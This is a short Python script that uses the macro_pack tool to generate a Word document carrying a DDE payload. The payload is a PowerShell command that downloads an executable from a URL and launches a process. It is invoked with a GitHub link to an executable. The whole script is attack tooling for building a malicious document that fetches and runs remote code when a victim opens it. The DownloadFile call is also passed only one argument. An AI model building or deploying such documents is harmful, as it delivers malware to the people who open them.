import os
def pack_DDE(url, proc_name):
	ps = "powershell  (New-Object System.Net.WebClient).DownloadFile('{0}');Start-Process '{1}';exit;".format(url,proc_name)
	open('ps_command.cmd','w').write(ps)
	if (os.path.isfile("document.doc")):
		os.remove("document.doc")
	os.system('macro_pack.exe --dde -f ps_command.cmd -G document.doc')

pack_DDE('https://github.com/pro4m/Prison/blob/master/sample/putty.exe','hihi.exe')


	
